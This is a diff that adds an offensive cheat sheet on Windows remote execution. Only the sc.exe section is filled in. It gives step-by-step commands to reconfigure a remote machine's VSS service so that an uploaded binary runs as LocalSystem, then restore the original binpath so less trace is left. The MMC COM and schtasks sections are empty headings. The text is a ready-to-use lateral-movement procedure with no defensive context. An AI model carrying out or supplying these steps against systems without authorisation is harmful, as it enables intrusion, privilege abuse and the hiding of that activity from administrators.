@@ -1,1 +1,44 @@
 
+-- Remote Execution --
+
+·sc.exe Remote Execution
+·MMC COM Object
+·Remote Schtasks Execution
+
+Upload binary to remote machine, modify existing service to point at that binary, start the service, and re-configure the service binpath back to its original value. VSS is a service that works 
+great for this technique, but other services can work if they meet the requirements listed in the right column below.
+
+
+-- sc.exe Remote Execution --
+
+# Ensure service runs as LocalSystem and log original binary path
+sc \\<IP_ADDRESS> qc vss
+
+# Ensure service is currently off
+sc \\<IP_ADDRESS> query vss
+
+# Set remote machine binpath to uploaded binary
+sc \\<IP_ADDRESS> config vss binpath= "<FILE_PATH>"
+
+# Ensure remote machine service binpath was set correctly
+sc \\<IP_ADDRESS> qc vss
+
+# Start service on remote machine
+sc \\<IP_ADDRESS> start vss
+
+# Ensure service is off before setting binpath back to original
+sc \\<IP_ADDRESS> stop vss
+
+# Set remote machine service binpath back to original
+sc \\<IP_ADDRESS> config vss binpath= "<FILE_PATH>"
+
+# Ensure remote machine service binpath was set back correctly
+sc \\<IP_ADDRESS> qc vss
+
+
+-- MMC COM Object --
+
+
+-- Remote Schtasks Execution --
+
+
